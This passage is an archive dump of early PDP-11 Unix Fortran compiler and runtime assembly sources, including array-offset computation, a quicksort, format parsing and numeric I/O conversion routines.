/ fxh -- array constant offset

.globl	consub

.globl	getsym
.globl	geti
.globl	error
.globl	geticon

/ turn constant subscripts into offset.
/	in: r3 -> symtab
/	    r1 -> just beyond (
/	out:r0 has offset

consub:
	mov	symtab(r3),r0
	bic	$!70,r0
	cmp	r0,$20		/ test class == array
	beq	1f
	jsr	r5,error; 17.
	clr	r0
	rts	r5
1:
	mov	r5,-(sp)
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	clr	r4		/ accumulated offset
	mov	symtab+2(r3),r2	/ ptr to declarator
	mov	(r2)+,-(sp)	/ dimensionality
	mov	$1,r5		/ prod of declarators
1:
	jsr	r5,geticon
		br 9f
	cmp	r0,(r2)
	bgt	3f
	dec	r0
	bge	2f
3:
	jsr	r5,error; 19.	/ out of range
	clr	r0
2:
	mov	r5,-(sp)
	mpy	r0,r5
	add	r5,r4
	mov	(sp)+,r5
	mpy	(r2)+,r5
	jsr	r5,getsym
	cmp	r0,$36.		/ comma
	bne	1f
	dec	(sp)
	bgt	1b
	jsr	r5,error; 18.	/ wrong subscript count
	br	1b
1:
	cmp	r0,$34.		/ )
	beq	1f
9:
	jsr	r5,error; 20.
	clr	r0
1:
	cmp	(sp)+,$1
	beq	1f
	jsr	r5,error; 18.	/ subscript count
1:
	mov	(sp)+,r2
	mov	(sp)+,r3
	movb	symtab+1(r3),r5
	mpy	r4,r5
	mov	r5,r0
	mov	(sp)+,r4
	mov	(sp)+,r5
	rts	r5

-- /usr/source/fort/fx/fxi.s mode=0100664 uid=3 gid=3 atime=174920970 mtime=174844642 --
/
/

/ quicker sort

/	mov	$base,r1
/	mov	$base+[n*width],r2
/	mov	$width,r3
/	jsr	pc,qsort

/	r0,r1,r2,r3,r4 are used

.globl	qsort
.globl	compare

qsort:
	mov	r5,-(sp)
	mov	r4,-(sp)
	bit	$1,r3
	bne	1f
	bit	$1,r1
	bne	1f
	cmp	r3,$2
	bne	2f
	mov	$exch1,exchange
	br	3f
2:
	mov	r3,r5
	clc
	ror	r5
	mov	r5,width
	mov	$exchw,exchange
	br	3f
1:
	mov	$exchb,exchange
3:
	jsr	pc,qs1
	mov	(sp)+,r4
	mov	(sp)+,r5
	rts	pc

qs1:
	mov	r1,r5
	neg	r5
	add	r2,r5
	bgt	1f
	rts	pc
1:
	clr	r4
	dvd	r3,r4
	asr	r4
	mpy	r3,r4
	mov	r5,r4
	add	r1,r4

	mov	r1,-(sp)
	mov	r2,-(sp)

loop:
	cmp	r1,r4
	bhis	loop1
	mov	r1,r0
	jsr	pc,compare
	bgt	loop1
	add	r3,r1
	br	loop

loop1:
	cmp	r2,r4
	blos	1f
	sub	r3,r2
	mov	r2,r0
	jsr	pc,compare
	bge	loop1

	jsr	pc,*exchange
	cmp	r1,r4
	bne	loop
	mov	r2,r4
	br	loop

1:
	cmp	r1,r4
	beq	1f
	jsr	pc,*exchange
	mov	r1,r4
	br	loop1

1:
	mov	(sp)+,r2
	mov	r4,-(sp)
	mov	r4,r1
	add	r3,r1
	mov	r2,r0
	sub	r1,r0
	sub	2(sp),r4
	cmp	r0,r4
	blo	1f
	mov	(sp)+,r0
	mov	(sp)+,r4
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r0,r2
	mov	r4,r1
1:
	jsr	pc,qs1
	mov	(sp)+,r2
	mov	(sp)+,r1
	br	qs1

exchb:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,r5
1:
	movb	(r1),r0
	movb	(r2),(r1)+
	movb	r0,(r2)+
	sob	r5,1b
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	pc

exchw:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	width,r5
1:
	mov	(r1),r0
	mov	(r2),(r1)+
	mov	r0,(r2)+
	sob	r5,1b
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	pc

exch1:
	mov	(r1),r0
	mov	(r2),(r1)
	mov	r0,(r2)
	rts	pc

.bss
exchange: .=.+2
width:	.=.+2
-- /usr/source/fort/fx/fxx.s mode=0100664 uid=3 gid=3 atime=174920973 mtime=174844647 --
/
/

/ fxx -- data segment definition

.data
.globl	holround
holround:	4

.bss

/ pass 1

.globl	dimu
dimu:	.=.+2

/ pass 2

.globl	eqvtab

/ pass 3 stuff

.globl	conu
.globl	dou
.globl	blockp
.globl	dotabp
.globl	dotab
.globl	edotab
.globl	functn
.globl	blocks

conu:	.=.+2
dou:	.=.+2
blockp:	.=.+2
dotabp:	.=.+2
dotab:	.=.+60.
edotab:
functn:	.=.+2

/ pass 4

.globl	negflg
.globl	repfact
.globl	contab
.globl	dattab

negflg:	.=.+2
repfact:.=.+2

/ general buffer

xbufsiz	= 2200.

.globl	xbuf

xbuf:	.=.+xbufsiz

eqvtab	= xbuf+518.	/ for pass 2

blocks	= xbuf		/ for pass 3

dattab	= xbuf+518.	/ for pass 4
contab	= xbuf+xbufsiz

/ for all passes

data:
	ibuf:	.=.+518.
	obuf:	.=.+518.
	tbuf:	.=.+518.
	line:	.=.+linsize
	eline:	.=.+4
	ifno:	.=.+2
	efno:	.=.+2
	errp:	.=.+2	/ init(errb)
	errb:	.=.+12.
	eerrb:		/ size 0 mod 4
	symtab:	.=.+symsize
	esymtab:
	esymp:	.=.+2	/ init(esymtab)
	symtp:	.=.+2
	namebuf:.=.+namsize
	enamebuf:
	namep:	.=.+2	/ init(namebuf)
.=.+40	/fake
	.=.+1		/ make odd
	symbuf:	.=.+smblsize	/ init(<_>)
	esymbuf:
	ch:	.=.+1
	ch1:	.=.+1
	progt:	.=.+2
	holquo:	.=.+2
	nxtaloc:.=.+2
	imptab:	.=.+[26.*2*2]	/ 26 letters, 2 alphabets, 2 bytes
	nerror:	.=.+2
	temp:	.=.+2
	functm:	.=.+2
edata:
dsize	=.-data

-- /usr/source/fort/io mode=0140775 uid=3 gid=3 atime=174930095 mtime=174920999 --
-- /usr/source/fort/io/io1.s mode=0100664 uid=3 gid=3 atime=174920992 mtime=174844659 --
/
/

/ io1 --  I/O operators


.globl	rerr
.globl	endio
.globl	rio4
.globl	rio8
.globl	iio2
.globl	iio4
.globl	lio2
.globl	lio1
.globl	cio8
.globl	cio16
.globl	ecvt
.globl	fcvt
.globl	_ndigit

endio:
	mov	(sp)+,r5
	rts	r5

cio8:
	tst	slcnt
	bne	2f
	inc	slcnt
	tst	-(r4)
	br	rio4
2:
	clr	slcnt
	mov	ilval,-(sp)
	add	$4,(sp)
	br	rio4

cio16:
	tst	slcnt
	bne	2f
	inc	slcnt
	tst	-(r4)
	br	rio8
2:
	clr	slcnt
	mov	ilval,-(sp)
	add	$8,(sp)
	br	rio8

rio8:
	mov	$8.\<8+'r,r0
	br	1f

rio4:
	mov	$4\<8+'r,r0
	br	1f

iio4:
	mov	$4\<8+'i,r0
	br	1f

iio2:
	mov	$2\<8+'i,r0
	br	1f

lio2:
	mov	$2\<8+'l,r0
	br	1f

lio1:
	mov	$1\<8+'l,r0

1:
	mov	r0,itype
	mov	(sp)+,ilval
	mov	(sp)+,r5
	tst	(r5)+
	rts	r5

-- /usr/source/fort/io/io2.s mode=0100664 uid=3 gid=3 atime=174920993 mtime=174844664 --
/
/

/ io2 -- format cracker

.globl	iowf
.globl	iowp
.globl	iorf

iowp:
	mov	(sp)+,formp
	mov	$6,r1
	br	1f

iowf:
	mov	(sp)+,formp
	tst	(sp)+
	mov	(sp)+,r1
1:
	jsr	r5,setio; 2		/ write
	clr	rdflg
	br	1f

iorf:
	mov	(sp)+,formp
	tst	(sp)+
	mov	(sp)+,r1
	jsr	r5,setio; 1		/ read
	mov	pc,rdflg

1:
	clr	binflg
	clr	slcnt
	clr	itmfnd
	clr	scale
	clr	itmflg
	mov	$pbuf,ppar
	mov	$-1,llpcnt
	jsr	r5,fmtchr
	mov	formp,llp
	cmp	r0,$'(
	beq	crack
	jsr	r5,rerr; 106.
	sys	exit
crack:
	clr	ngflg
	mov	$1,rep
item:
	jsr	r5,fmtchr
	cmp	$' ,r0
	beq	item
	cmp	$'\t,r0
	beq	item
	jsr	r5,switch; mswitch
	jsr	r5,rerr; 105.
	sys	exit

mswitch:
	'a; afmt
	'f; ffmt
	'e; efmt
	'g; gfmt
	'd; dfmt
	'i; ifmt
	'l; lfmt
	'h; hfmt
	'x; xfmt
	'p; scal
	'-; minus
	'0; numb
	'1; numb
	'2; numb
	'3; numb
	'4; numb
	'5; numb
	'6; numb
	'7; numb
	'8; numb
	'9; numb
	',; crack
	'/; slash
	'(; lpar
	'); rpar
	'"; quote
	' ; item
	0; 0

minus:
	jsr	r5,gnum
	neg	r0
	br	1f
numb:
	dec	formp
	jsr	r5,gnum
1:
	mov	r0,rep
	br	item

scal:
	mov	rep,scale
	br	crack

elist:
	tst	_nocr
	beq	1f
	tst	rdflg
	bne	1f
	jsr	r5,eorec1
	br	2f
1:
	jsr	r5,eorec
2:
	jmp	*(r4)+

slash:
	jsr	r5,eorec
	br	crack

rpar:
	mov	ppar,r0
	cmp	r0,$pbuf		/ see if outer parens
	blos	2f
	dec	-2(r0)
	ble	1f		/ no repeats left
	mov	-4(r0),formp	/ reset scan
	br	crack
1:
	sub	$4,ppar
	br	crack		/ pop parens
2:
	jsr	r5,getitm
		br elist
	tst	itmfnd
	bne	1f
	jsr	r5,rerr; 107.
	sys	exit
1:
	jsr	r5,eorec
	inc	itmflg
	mov	llpcnt,r1
	bpl	1f
	mov	llp,formp
	jmp	crack
1:
	mov	llp,r2
	mov	r2,formp
	mov	ppar,r0
	mov	r2,(r0)+
	mov	r1,(r0)+
	mov	r0,ppar
	jbr	crack1

lpar:
	mov	ppar,r0
	cmp	r0,$pbuf+10
	blo	1f
	jsr	r5,rerr; 108.
	sys	exit
1:
	mov	formp,(r0)+
	mov	rep,(r0)+
	mov	r0,ppar
	cmp	r0,$pbuf+4
	bhi	1f
	mov	formp,llp
	mov	rep,llpcnt
1:
	jmp	crack
quote:
	inc	ngflg
	mov	$44,-(sp)
	br	3f

hfmt:
	inc	ngflg
	mov	$40,-(sp)
	br	3f

xfmt:
	inc	ngflg
	mov	$34,-(sp)
	br	3f

afmt:
	mov	$30,-(sp)
	br	1f

ifmt:
	clr	-(sp)
	br	1f

lfmt:
	mov	$4,-(sp)
1:
	jsr	r5,gnum
	mov	r0,width
	br	2f

ffmt:
	mov	$10,-(sp)
	br	1f

dfmt:
	mov	$14,-(sp)
	br	1f

gfmt:
	mov	$20,-(sp)
	br	1f

efmt:
	mov	$24,-(sp)

1:
	jsr	r5,gnum
	mov	r0,width
4:
	jsr	r5,fmtchr
	cmp	r0,$' /
	beq	4b
	cmp	r0,$'.
	bne	err1
	jsr	r5,gnum
	mov	r0,ndig
2:
	inc	itmfnd
3:
	add	$cvsw,(sp)
	tst	rdflg
	beq	1f
	add	$2,(sp)
1:
	mov	*(sp)+,-(sp)
1:
	tst	ngflg
	bne	2f
	jsr	r5,getitm
		br 1f
2:
	clr	gflg
	jsr	r5,*(sp)
	dec	rep
	bgt	1b
	tst	(sp)+
	br	crack1
1:
	tst	(sp)+
	jmp	elist

cvsw:
	iocv; iicv	/ 0
	locv; licv	/ 4
	focv; ficv	/ 10
	docv; dicv	/ 14
	gocv; gicv	/ 20
	eocv; eicv	/ 24
	aocv; aicv	/ 30
	xocv; xicv	/ 34
	hocv; hicv	/ 40
	qocv; qicv	/ 44

crack1:
	jmp	crack

err1:
	jsr	r5,rerr; 109.
	sys	exit

-- /usr/source/fort/io/io3.s mode=0100664 uid=3 gid=3 atime=174920993 mtime=174844668 --
/
/

/ io3 --  Fortran I/O

.globl	getbuf
.globl	chkunit
.globl	creatf
.globl	openf

setio:
	mov	r1,unit
	jsr	r5,chkunit
	movb	utable(r1),r0
	beq	1f
	bpl	2f
	mov	r1,r0
	asl	r0
	mov	btable(r0),r0
	mov	r0,r2
	br	4f
2:
	cmp	(r5),r0
	beq	3f
	jsr	r5,rerr; 101.		/ inconsistent use of unit
	sys	exit
1:
	mov	r1,-(sp)
	clr	r0
	dvd	$10.,r0
	swab	r1
	bis	r1,r0
	add	$"00,r0
	mov	r0,filnam+4
	mov	(sp)+,r1
	jsr	r5,getbuf
	mov	$filnam,r0
4:
	movb	(r5),utable(r1)
	bit	$1,(r5)
	bne	2f
	jsr	r5,creatf
	br	3f
2:
	jsr	r5,openf
3:
	tst	(r5)+
	asl	r1
	mov	btable(r1),buffer
	rts	r5

getbuf:
	mov	$utable,r0
	mov	$btable,r2
1:
	tstb	(r0)+
	beq	2f
	tst	(r2)+
	br	3f
2:
	tst	(r2)+
	beq	3f
	mov	-(r2),r0
	clr	(r2)
	mov	r0,r2
	br	2f
3:
	cmp	r0,$utable+20.
	blo	1b
	mov	bufp,r2
	add	$134.,bufp
	mov	bufp,0f
	sys	break; 0:..
2:
	mov	r1,r0
	asl	r0
	mov	r2,btable(r0)
	mov	r2,buffer
	rts	r5

chkunit:
	cmp	r1,$20.
	blo	1f
	jsr	r5,rerr; 100.		/ illegal unit number
	sys	exit
1:
	rts	r5

creatf:
	cmp	unit,$6
	bne	2f
	mov	$1,r0
	br	1f
2:
	mov	r0,0f
	sys	creat; 0:..; 666
	bec	1f
	jsr	r5,rerr; 102.		/ create error
	sys	exit
1:
	mov	r2,-(sp)
	mov	r0,(r2)+
	clr	(r2)+
	clr	(r2)+
	mov	r2,-(r2)
	mov	(sp)+,r2
	rts	r5

openf:
	cmp	unit,$5
	bne	2f
	clr	r0
	br	1f
2:
	mov	r0,0f
	sys	open; 0:..; 0
	bec	1f
	jsr	r5,rerr; 103.		/ open error
	sys	exit
1:
	mov	r2,-(sp)
	mov	r0,(r2)+
	clr	(r2)+
	clr	(r2)+
	mov	(sp)+,r2
	rts	r5

fputc:
	mov	r1,-(sp)
	mov	buffer,r1
	dec	2(r1)
	bge	1f
	mov	r0,-(sp)
	jsr	pc,flush1
	dec	2(r1)
	mov	(sp)+,r0
1:
	movb	r0,*4(r1)
	inc	4(r1)
	mov	(sp)+,r1
	rts	r5

fflush:
	mov	r1,-(sp)
	mov	buffer,r1
	jsr	pc,flush1
	mov	(sp)+,r1
	rts	r5

flush1:
	mov	r1,r0
	add	$6,r0
	mov	r0,-(sp)
	mov	r0,0f
	neg	r0
	add	4(r1),r0
	bhis	1f
	mov	r0,0f+2
	mov	(r1),r0
	sys	write; 0:..; ..
1:
	mov	(sp)+,4(r1)
	mov	$128.,2(r1)
	rts	pc

fgetc:
	tst	nlflg
	bne	4f
	mov	r1,-(sp)
	mov	buffer,r1
	dec	2(r1)
	bge	1f
	mov	r1,r0
	add	$6,r0
	mov	r0,0f
	mov	r0,4(r1)
	mov	(r1),r0
	sys	read; 0:..; 128.
	bes	2f
	tst	r0
	bne	3f
2:
	jsr	r5,rerr; 104.		/ EOF on input
	sys	exit
3:
	dec	r0
	mov	r0,2(r1)
1:
	clr	r0
	bisb	*4(r1),r0
	inc	4(r1)
	mov	(sp)+,r1
	tst	binflg
	bne	1f
	cmp	r0,$'\n
	bne	1f
4:
	mov	pc,nlflg
	mov	$' ,r0
1:
	rts	r5

gnum:
	mov	r1,-(sp)
	clr	r1
1:
	jsr	r5,fmtchr
	cmp	r0,$'  /
	beq	1b
	sub	$'0,r0
	cmp	r0,$9.
	bhi	1f
	mpy	$10.,r1
	add	r0,r1
	br	1b
1:
	mov	r1,r0
	mov	(sp)+,r1
	dec	formp
	rts	r5

switch:
	mov	(r5)+,r1
1:
	tst	(r1)
	beq	1f
	cmp	r0,(r1)+
	bne	1b
	tst	(sp)+
	jmp	*(r1)
1:
	rts	r5

fmtchr:
	movb	*formp,r0
	inc	formp
	rts	r5

getitm:
	tst	itmflg
	bne	1f
	mov	r5,-(sp)
	jmp	*(r4)+
1:
	clr	itmflg
	tst	(r5)+
	rts	r5

/ just a fake, there's no carriage control

fputcc:
	cmp	$' ,r0
	bne	1f
	inc	nspace
	rts	r5
1:
	mov	r0,-(sp)
1:
	dec	nspace
	blt	1f
	mov	$' ,r0
	jsr	r5,fputc
	br	1b
1:
	clr	nspace
	mov	(sp)+,r0
	beq	1f
	jsr	r5,fputc
1:
	rts	r5

eorec:
	mov	unit,r0
	bitb	$1,utable(r0)
	bne	1f
	clr	nspace
	mov	$'\n,r0
	jsr	r5,fputc
eorec1:
	clr	r0
	jsr	r5,fputcc
/	cmp	unit,$6			/ tty output
/	bne	2f
	jsr	r5,fflush
2:
	rts	r5
1:
	tst	nlflg
	bne	1f
	jsr	r5,fgetc
	br	1b
1:
	clr	nlflg
	rts	r5

spaces:
	add	r1,nspace
	rts	r5

-- /usr/source/fort/io/io4.s mode=0100664 uid=3 gid=3 atime=174920993 mtime=174844673 --
/
/

/ io4 -- numeric output conversion

qicv:
hicv:
	jsr	r5,rerr; 999.
	sys	exit

xicv:
	jsr	r5,fgetc
	rts	r5

gocv:
	mov	pc,gflg
	jsr	r5,getarg
	mov	ndig,_ndigit
	jsr	pc,ecvt
	tst	r2
	bmi	eocv
	cmp	r2,ndig
	bgt	eocv
	sub	r2,ndig
	sub	$4,width
	jsr	r5,focv
	add	$4,width
	add	$4,nspace
	rts	r5

eocv:
	mov	$'e,-(sp)
	br	1f

docv:
	mov	$'d,-(sp)
1:
	tst	gflg
	bne	1f
	jsr	r5,getarg
1:
	mov	ndig,r1
	add	$6,r1
	add	nflg,r1
	sub	width,r1
	bge	2f
	sub	r1,nspace
2:
	tst	nflg
	beq	2f
	mov	$'-,r0
	jsr	r5,fputcc
2:
	mov	ndig,r1
	mov	scale,r0
	bgt	2f
	add	r0,r1
	br	3f
2:
	inc	r1
3:
	mov	r1,_ndigit
	jsr	pc,ecvt
	mov	r0,r1
	mov	r2,-(sp)
	mov	scale,r2
	sub	r2,(sp)
	tst	r2
	bgt	2f
	mov	$'0,r0
	jsr	r5,fputcc
	br	3f
2:
	movb	(r1)+,r0
	dec	_ndigit
	jsr	r5,fputcc
	sob	r2,2b
3:
	mov	$'.,r0
	jsr	r5,fputcc
	neg	r2
	ble	2f
3:
	mov	$'0,r0
	jsr	r5,fputcc
	sob	r2,3b
2:
	mov	_ndigit,r2
	ble	2f
3:
	movb	(r1)+,r0
	jsr	r5,fputcc
	sob	r2,3b
2:
	mov	2(sp),r0
	jsr	r5,fputcc
	mov	(sp)+,r1
	bge	2f
	mov	$'-,r0
	jsr	r5,fputcc
	neg	r1
	br	3f
2:
	mov	$'+,r0
	jsr	r5,fputcc
3:
	clr	r0
	div	$10.,r0
	add	$'0,r0
	jsr	r5,fputcc
	mov	r1,r0
	add	$'0,r0
	jsr	r5,fputcc
	tst	(sp)+
	rts	r5

iocv:
	clr	-(sp)
	clr	ndig
	br	1f

focv:
	mov	$1,-(sp)
1:
	clr	-(sp)
	tst	gflg
	bne	1f
	jsr	r5,getarg
	tst	2(sp)
	beq	1f
	mov	scale,(sp)
1:
	mov	ndig,_ndigit
	add	(sp)+,_ndigit
	jsr	pc,fcvt
	mov	r0,r1
	tst	(sp)
	beq	1f
	tst	gflg
	bne	1f
	add	scale,r2
1:
	mov	ndig,r0
	add	(sp),r0
	add	nflg,r0
	tst	r2
	ble	1f
	add	r2,r0
	br	2f
1:
	inc	r0
2:
	sub	width,r0
	bge	1f
	sub	r0,nspace
1:
	tst	nflg
	beq	1f
	mov	$'-,r0
	jsr	r5,fputcc
1:
	tst	r2
	bgt	1f
	mov	$'0,r0
	jsr	r5,fputcc
	br	2f
1:
	movb	(r1)+,r0
	jsr	r5,fputcc
	sob	r2,1b
2:
	tst	(sp)+
	beq	1f
	mov	$'.,r0
	jsr	r5,fputcc
1:
	mov	ndig,-(sp)
	ble	1f
	tst	r2
	bge	1f
	neg	r2
2:
	mov	$'0,r0
	jsr	r5,fputcc
	dec	ndig
	ble	1f
	sob	r2,2b
1:
	mov	ndig,r2
	ble	2f
1:
	movb	(r1)+,r0
	jsr	r5,fputcc
	sob	r2,1b
2:
	mov	(sp)+,ndig
	rts	r5

getarg:
	clr	nflg
	setd
	cmpb	itype,$'r
	beq	1f
	seti
	cmpb	ilen,$4
	bne	2f
	setl
2:
	cmpb	ilen,$1
	beq	3f
	movif	*ilval,r0
	br	2f
3:
	movb	*ilval,r0
	movif	r0,fr0
	br	2f
1:
	cmpb	ilen,$4
	bne	1f
	movof	*ilval,r0
	br	2f
1:
	movf	*ilval,r0
2:
	cfcc
	bge	1f
	absf	r0
	mov	$1,nflg
1:
	rts	r5

-- /usr/source/fort/io/io5.s mode=0100664 uid=3 gid=3 atime=174920993 mtime=174844676 --
/
/

/ io5 -- more conversions

/.globl	hocv
/.globl	qocv
/.globl	xocv
/.globl	aocv
/.globl	locv
/
/.globl	fmtchr
/.globl	fputcc
/.globl	rep
/.globl	formp
/.globl	spaces
/.globl	ilen
/.globl	width
/.globl	ilval
.globl	rerr

hocv:
	jsr	r5,fmtchr
	tst	r0
	beq	2f
	jsr	r5,fputcc
	dec	rep
	bgt	hocv
	rts	r5
2:
	jsr	r5,rerr; 111.
	sys	exit

qocv:
	mov	formp,-(sp)
1:
	jsr	r5,fmtchr
	tst	r0
	beq	2f
	cmp	r0,$'"
	beq	2f
	jsr	r5,fputcc
	br	1b
2:
	dec	rep
	ble	1f
	mov	(sp),formp
	br	1b
1:
	tst	(sp)+
	rts	r5

xocv:
	mov	$1,r1
	jsr	r5,spaces
	rts	r5

aocv:
	movb	ilen,r1
	sub	width,r1
	neg	r1
	bpl	1f
	clr	r1
1:
	jsr	r5,spaces
	mov	ilval,r2
	mov	width,r1
	cmpb	r1,ilen
	ble	2f
	movb	ilen,r1
2:
	movb	(r2)+,r0
	jsr	r5,fputcc
	dec	r1
	bgt	2b
	rts	r5

locv:
	mov	width,r1
	dec	r1
	jsr	r5,spaces
	mov	$'f,r0
	movb	ilen,r1
	mov	ilval,r2
2:
	tstb	(r2)+
	bne	1f
	dec	r1
	bgt	2b
	br	2f
1:
	mov	$'t,r0
2:
	jsr	r5,fputcc
	rts	r5

-- /usr/source/fort/io/io6.s mode=0100664 uid=3 gid=3 atime=174920994 mtime=174844681 --
/
/

/ io6 --  input conversions

/.globl	aicv
/.globl	gicv
/
/.globl	ilval
/.globl	width
/.globl	ilen
/.globl	fgetc
/.globl	itype
/.globl	nlflg
/.globl	gcflg

aicv:
	mov	ilval,r1
	movb	width,r2
	movb	ilen,r0
	mov	r0,-(sp)
1:
	cmp	r2,(sp)
	ble	1f
	jsr	r5,fgetc
	dec	r2
	br	1b
1:
	tst	r2
	ble	1f
	jsr	r5,fgetc
	movb	r0,(r1)+
	dec	r2
	dec	(sp)
	br	1b
1:
	tst	(sp)
	ble	1f
	movb	$' ,(r1)+
	dec	(sp)
	br	1b
1:
	tst	(sp)+
	rts	r5

licv:
	mov	width,twidth
	setd
	seti
	clrf	fr0
1:
	jsr	r5,fgetcn
	cmp	r0,$'t
	beq	2f
	cmp	r0,$'T
	beq	2f
	cmp	r0,$'1
	beq	2f
	cmp	r0,$',
	beq	1f
	br	1b
2:
	movif	$1,fr0
	br	1b
1:
	br	storin

iicv:
	clr	ndig

ficv:
eicv:
dicv:
	mov	width,twidth
	br	1f

gicv:
	mov	$16383.,twidth
	clr	ndig
	mov	pc,gcflg
	br	2f
1:
	clr	gcflg
2:
	jsr	r5,gatof
storin:
	cmpb	itype,$'r
	beq	1f
	cmpb	ilen,$1
	beq	3f
	cmpb	ilen,$4
	bne	2f
	setl
2:
	movfi	fr0,*ilval
	rts	r5
3:
	movfi	fr0,r0
	movb	r0,*ilval
	rts	r5
1:
	cmpb	ilen,$8.
	beq	2f
	setf
2:
	movf	fr0,*ilval
	rts	r5

gatof:
	setd
	seti
	movif	$10.,fr3
	clr	r2
	clrf	fr0
	clr	-(sp)
1:
	jsr	r5,fgetcn
	cmp	$' ,r0
	bne	1f
	tst	nlflg
	beq	1b
	tst	(sp)+
	rts	r5
1:
	cmp	r0,$'+
	beq	1f
	cmp	r0,$'-
	bne	2f
	inc	(sp)
1:
	jsr	r5,fgetcn
2:
	cmp	$' ,r0
	bne	3f
	tst	gcflg
	bne	3f
	mov	$'0,r0
3:
	sub	$'0,r0
	cmp	r0,$9.
	bhi	2f
	mulf	fr3,fr0
	movif	r0,fr1
	addf	fr1,fr0
	dec	r1
	br	1b
2:
	add	$'0,r0
	cmp	r0,$'.
	bne	1f
	inc	r2
	clr	r1
	br	1b
1:
	mov	r3,-(sp)
	clr	r3
	cmp	r0,$'d
	beq	3f
	cmp	r0,$'+
	beq	3f
	cmp	r0,$'-
	beq	3f
	cmp	r0,$'e
	bne	2f
3:
	jsr	r5,atoi
2:
	tst	r2
	bne	1f
	mov	ndig,r1
	neg	r1
1:
	movf	fr3,fr2
	add	r3,r1
	mov	(sp)+,r3
	tst	r1
	beq	1f
	bpl	3f
	neg	r1
	mov	pc,-(sp)
	br	2f
3:
	clr	-(sp)
2:
	dec	r1
	ble	2f
	mulf	fr3,fr2
	br	2b
2:
	tst	(sp)+
	bne	2f
	mulf	fr2,fr0
	br	1f
2:
	divf	fr2,fr0
1:
	tst	(sp)+
	beq	1f
	negf	r0
1:
	cmp	r0,$',
	beq	1f
	cmp	$' ,r0
	beq	1f
	jsr	r5,rerr; 110.
1:
	rts	r5

atoi:
	clr	-(sp)
	cmp	r0,$'+
	beq	1f
	cmp	r0,$'-
	beq	3f
	jsr	r5,fgetcn
	cmp	r0,$'+
	beq	1f
	cmp	r0,$'-
	bne	2f
3:
	inc	(sp)
1:
	jsr	r5,fgetcn
2:
	sub	$'0,r0
	cmp	r0,$'9.
	bhi	2f
	mpy	$10.,r3
	add	r0,r3
	br	1b
2:
	add	$'0,r0
	tst	(sp)+
	beq	1f
	neg	r3
1:
	rts	r5

fgetcn:
	tst	twidth
	bgt	1f
	mov	$',,r0
	rts	r5
1:
	jsr	r5,fgetc
	dec	twidth
	rts	r5

-- /usr/source/fort/io/io7.s mode=0100664 uid=3 gid=3 atime=174920994 mtime=174844685 --
/
/

/ Fortran binary I/O

.globl	iowu
.globl	ioru
.globl	rewi
.globl	enfl

iowu:
	tst	(sp)+
	mov	(sp)+,r1		/ unit number
	jsr	r5,setio; 42
1:
	jsr	r5,getitm
		br 1f
	movb	ilen,r1
	mov	ilval,r2
2:
	movb	(r2)+,r0
	jsr	r5,fputc
	sob	r1,2b
	br	1b
1:
	jsr	r5,fflush
	jmp	*(r4)+

ioru:
	tst	(sp)+
	mov	(sp)+,r1		/ unit number
	jsr	r5,setio; 41
	clr	nlflg
	mov	pc,binflg
1:
	jsr	r5,getitm
		br 1f
	movb	ilen,r1
	mov	ilval,r2
2:
	jsr	r5,fgetc
	movb	r0,(r2)+
	sob	r1,2b
	br	1b
1:
	jmp	*(r4)+

rewi:
enfl:
	tst	(sp)+
	mov	(sp)+,r1		/ unit number
	jsr	r5,chkunit
	clrb	utable(r1)
	asl	r1
	mov	*btable(r1),r0
	cmp	r0,$1
	bhi	1f
	sys	seek; 0; 0
	jmp	*(r4)+
1:
	sys	close
	jmp	*(r4)+
-- /usr/source/fort/io/iox.s mode=0100664 uid=3 gid=3 atime=174920994 mtime=174844689 --
/
/

/ iox -- io variables

.globl	_nocr
.globl	utable
.globl	btable
.globl	ftable

.globl	_end
.globl	formp

bufp:	_end
filnam:
	<fortxx\0>; .even

	.bss

gflg:	.=.+2
formp:	.=.+2
rdflg:	.=.+2
nflg:	.=.+2
unit:	.=.+2
buffer:	.=.+2
slcnt:	.=.+2
itype:	.=.+1
ilen:	.=.+1
ilval:	.=.+2
width:	.=.+2
twidth:	.=.+2
ndig:	.=.+2
pbuf:	.=.+10
ppar:	.=.+2
llp:	.=.+2
llpcnt:	.=.+2
itmflg:	.=.+2
nspace:	.=.+2
gcflg:	.=.+2
binflg:	.=.+2

utable:	.=.+20.
btable:	.=.+40.
ftable:	.=.+2.
rep:	.=.+2
scale:	.=.+2
itmfnd:	.=.+2
ngflg:	.=.+2
nlflg:	.=.+2
_nocr:	.=.+2

-- /usr/source/fort/rt mode=0140775 uid=3 gid=3 atime=174930096 mtime=174921042 --
-- /usr/source/fort/rt/r0.s mode=0100664 uid=3 gid=3 atime=174920999 mtime=174844720 --
/
/

.globl	main
.globl	temp
.globl	rerr
.globl	fptrap

.comm	erret,2
.comm	argp,2

ldfps	= 170100^tst

	sys	signal; 4; fptrap
	ldfps	$5400
	mov	sp,argp
	mov	$main,r4
	jmp	*(r4)+

rerr:
	mov	(r5)+,r1
	tst	erret
	beq	1f
	jsr	pc,erret
1:
	mov	$temp,r2
	jsr	r5,1f
	movb	$'\n,(r2)+
	sub	$mesg,r2
	mov	r2,0f
	mov	$2,r0
	sys	write; mesg; 0:..
	sys	exit
1:
	clr	r0
	div	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	beq	1f
	jsr	r5,1b
1:
	mov	(sp)+,r0
	add	$'0,r0
	movb	r0,(r2)+
	rts	r5

mesg:
	<Runtime error >
temp:	.=.+16.

-- /usr/source/fort/rt/r1.s mode=0100664 uid=3 gid=3 atime=174921002 mtime=174844725 --
/
/

/ r1 -- fortran runtime

.globl	gas1
.globl	gas2
.globl	gas4
.globl	gas8
.globl	stop
.globl	lval
.globl	rval4
.globl	rval8
.globl	do1
.globl	do12
.globl	do14
.globl	do2
.globl	do22
.globl	do24
.globl	goto
.globl	cgoto
.globl	cagoto
.globl	agoto

.globl	rerr

gas8:
	mov	8.(sp),r0
	mov	(sp)+,(r0)+
	mov	(sp)+,(r0)+
	br	1f

gas1:
	movb	(sp)+,*(sp)+
	jmp	*(r4)+

gas2:
	mov	(sp)+,*(sp)+
	jmp	*(r4)+

gas4:
	mov	4(sp),r0
1:
	mov	(sp)+,(r0)+
	mov	(sp)+,(r0)
	tst	(sp)+
	jmp	*(r4)+

stop:
	sys	exit

lval:
	mov	(r4)+,-(sp)
	jmp	*(r4)+

rval8:
	mov	(r4)+,r0
